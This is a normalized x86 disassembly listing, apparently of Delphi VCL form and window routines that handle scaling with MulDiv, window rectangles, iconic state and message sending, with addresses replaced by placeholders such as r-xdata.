mov edx [ eax + 0xc ]
add edx esi
call sub_44f01c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43bab4
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43baf8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44f01c
jmp r-xdata
mov esi [ ebx + 0x250 ]
mov eax ebx
call sub_43bab4
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44f01c
mov eax ebx
call sub_43bab4
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43baf8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x254 ]
mov eax ebx
call sub_43baf8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44f01c
mov eax ebx
call sub_43baf8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44f900
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_44f01c
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_44f01c
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x250 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x254 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44f16c
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44f16c
sub_44f9a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f900
mov ecx edi
mov edx esi
mov eax ebx
call sub_4436e8
pop edi
pop esi
pop ebx
retn
sub_44f9cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x25c ]
xor edx edx
push ebp
push sub_44fa38
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442038
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa3f
mov eax [ ebp - 0x4 ]
dec [ eax + 0x25c ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44fa3f
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x260 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
xor eax eax
push ebp
push sub_44fa87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f61c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa8e
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x260 ] dl
retn
sub_44fa8e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f69c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fb04
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_43bab4
mov edx [ ebx + 0x250 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jge r-xdata
mov esi eax
mov esi edx
jmp r-xdata
mov edi edx
mov edi eax
jmp r-xdata
mov eax ebx
call sub_43baf8
mov edx [ ebx + 0x254 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jle r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
neg eax
mov ecx esi
call sub_415398
mov eax [ esp ]
lea esi [ esp + 0x4 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov eax ebx
call sub_43f134
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_44fb84
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fbe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040f0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fbec
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44fc14
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fd78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44fd58
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp - 0x4 ]
call sub_403e3c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_404288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd5f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x1
xor eax eax
push ebp
push sub_44fd20
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_416580
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403e44
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
sub_44fda0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
test [ ebx + 0x358 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_404160
and [ ebx + 0x358 ] 0xdf
sub_44fdd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f3c0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_45577c
xor edx edx
mov eax ebx
call sub_4557b8
mov edx 0x140
mov eax ebx
call sub_43b830
mov edx 0xf0
mov eax ebx
call sub_43b864
mov dl 0x1
mov eax [ r-xdata ]
call sub_429df8
mov esi eax
mov [ ebx + 0x288 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x288 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4507c4
mov [ ebx + 0x278 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov esi eax
mov [ ebx + 0x280 ] esi
mov eax esi
mov edx ebx
call sub_43a9e4
movzx eax [ r-xdata ]
mov [ ebx + 0x270 ] al
mov [ ebx + 0x271 ] 0x2
mov [ ebx + 0x273 ] 0x0
mov [ ebx + 0x279 ] 0x3
mov [ ebx + 0x28c ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x2a4 ] eax
mov [ ebx + 0x27d ] 0x1
mov eax ebx
call sub_403e3c
mov [ ebx + 0xac ] eax
mov [ ebx + 0x329 ] 0xff
xor eax eax
mov [ ebx + 0x354 ] eax
xor edx edx
mov eax ebx
call sub_450b48
xor edx edx
mov eax ebx
call sub_43c30c
xor edx edx
mov eax ebx
call sub_43c274
mov dl 0x1
mov eax ebx
call sub_443dc4
mov edx ebx
mov eax [ rw-data ]
call sub_456044
mov [ ebx + 0x34c ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44ff59
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41dd10
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_416964
xor edx edx
mov eax ebx
call sub_41a3e0
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
mov eax ebx
call sub_454d9c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_44ffc4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404330
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45761c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_4500a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4534a4
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45607c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_403f64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_403f64
mov eax [ ebp - 0x4 ]
add eax 0x32c
call sub_40f8bc
mov eax [ ebp - 0x4 ]
add eax 0x338
call sub_40f8bc
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44f438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500b0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
sub_4500c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_450105
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450b48
sub_45010a
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_404160
test al al
jne r-xdata
call sub_404854
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
call sub_404800
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450b48
sub_450140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_450181
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4501a0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43e848
cmp [ ebx + 0x268 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edi [ ebx + 0x268 ]
xor eax eax
mov [ ebx + 0x268 ] eax
mov eax edi
mov si 0xffb6
call sub_404160
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax ebx
call sub_452fa4
sub_4501ec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43ffd8
mov eax ebx
sub al 0x1
jb r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
je r-xdata
cmp [ edi + 0x298 ] 0x0
je r-xdata
cmp [ edi + 0x290 ] 0x0
jne r-xdata
cmp esi [ edi + 0x290 ]
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x2a0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_451ecc
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp esi [ edi + 0x2a8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_451ea4
mov edx esi
mov eax edi
call sub_451ecc
jmp r-xdata
cmp esi [ edi + 0x334 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_451e80
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_4521f8
mov eax [ edi + 0x338 ]
test eax eax
je r-xdata
mov edx esi
call sub_416824
test eax eax
jl r-xdata
cmp esi [ edi + 0x340 ]
jne r-xdata
mov edx esi
call sub_416824
test eax eax
jl r-xdata
mov edx eax
mov eax [ edi + 0x32c ]
call sub_4166b4
mov edx edi
mov eax esi
call sub_41dd70
cmp esi [ edi + 0x2c4 ]
jne r-xdata
xor eax eax
mov [ edi + 0x340 ] eax
mov edx eax
mov eax [ edi + 0x338 ]
call sub_4166b4
mov edx edi
mov eax esi
call sub_41dd70
xor eax eax
mov [ edi + 0x2c4 ] eax
sub_450328
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor edx edx
push ebp
push sub_4505a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b4 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b8 ] edx
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403ef0
cmp eax [ r-xdata ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f0bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
je r-xdata
movzx eax [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x27c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43bacc
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov [ eax + 0x8c ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43bb10
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2a4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450714
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4505ad
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f900
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4436a0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f900
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43bbf4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4436a0
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_4238ac
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4238b4
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_4505b5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4405c0
push 0x0
push 0x0
push ebx
push sub_4506bc
movzx ecx [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_450688
push ebx
push sub_4506a0
movzx ecx [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_450667
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41aba0
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43c274
sub_45072f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f900
mov ecx edi
mov edx esi
mov eax ebx
call sub_43bbf4
mov ecx edi
mov edx esi
mov eax ebx
call sub_4436a0
mov eax ebx
call sub_450820
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423950
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_42396c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43baf8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43bab4
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_450ae0
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_450b14
sub_4507c4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_453618
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop ebx
retn
sub_450858
push ebx
mov ebx eax
mov eax ebx
call sub_451c60
test al al
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x271 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x258 ]
je r-xdata
sub_4508ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_443d50
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x290 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_450974
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4441e4
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41e09c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e070
mov edi eax
mov eax edi
mov si 0xfff1
call sub_404160
test al al
jne r-xdata
sub_4509e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403e3c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_450a24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebp
call sub_43ff78
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41e09c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44422c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41e070
mov si 0xfff1
call sub_404160
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41e0ac
jmp r-xdata
sub_450ab8
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43c330
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43d400
sub_450ae0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43bacc
pop ebx
retn
mov [ ebx + 0x2b0 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_450b14
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43bb10
pop ebx
retn
mov [ ebx + 0x2b4 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_450b48
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x358 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43c068
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x358 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x358 ] 0x2
jmp r-xdata
mov eax esi
call sub_452394
pop esi
pop ebx
retn
sub_450b8c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_450beb
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bf2
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub_450bfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
cmp ebx eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
je r-xdata
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_450cac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
